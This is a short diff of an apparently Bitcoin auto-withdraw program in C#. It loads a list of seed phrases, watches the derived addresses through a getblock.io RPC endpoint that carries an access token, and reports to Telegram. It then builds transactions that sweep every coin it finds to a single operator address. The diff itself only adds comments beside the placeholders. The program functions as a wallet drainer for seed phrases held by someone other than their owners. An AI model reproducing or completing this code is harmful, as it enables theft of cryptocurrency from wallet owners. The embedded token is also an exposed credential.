@@ -21,7 +21,7 @@ namespace BitcoinAuto.Withdraw
         [STAThread]
         static async Task Main()
         {
-            Telegram telegramNotifier = new Telegram("YOUR_TELEGRAM_BOT_TOKEN", "YOUR_CHAT_ID");
+            Telegram telegramNotifier = new Telegram("YOUR_TELEGRAM_BOT_TOKEN", "YOUR_CHAT_ID");  // Change
 
             if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), fileName)))
             {
@@ -57,7 +57,7 @@ namespace BitcoinAuto.Withdraw
             }
 
             Console.WriteLine($"----------------------------------\n[!] Automatic output is working\nValid seed phrases: {scsCount}\nDisabled Seed Phrases: {errorsCount}\n----------------------------------");
-            RPCClient rpcClient = new RPCClient(RPCCredentialString.Parse("https://go.getblock.io/c8c23aabfcaf43498750886b2acd1371"), NBitcoin.Network.Main);
+            RPCClient rpcClient = new RPCClient(RPCCredentialString.Parse("https://go.getblock.io/c8c23aabfcaf43498750886b2acd1371"), NBitcoin.Network.Main); //RPC Server
             int lastBlockHeight = 0;
 
             await telegramNotifier.sendNotification($"----------------------------------\n[!] Auto output is up and running!\nValid seed phrases: {scsCount}\nDisabled Seed Phrases: {errorsCount}\n----------------------------------");
@@ -88,7 +88,7 @@ namespace BitcoinAuto.Withdraw
 
                                 // Creating a transaction
                                 var secretString = addresses[destinationAddress];
-                                var destination = BitcoinAddress.Create("YOUR_BTC_ADDRESS", NBitcoin.Network.Main);
+                                var destination = BitcoinAddress.Create("YOUR_BTC_ADDRESS", NBitcoin.Network.Main);  // Change
                                 var txBuilder = NBitcoin.Network.Main.CreateTransactionBuilder();
                                 var coins = await rpcClient.ListUnspentAsync(0, 9999999, secretString.GetAddress(ScriptPubKeyType.Segwit));
                                 txBuilder.AddCoins(coins.Select(c => c.AsCoin()));
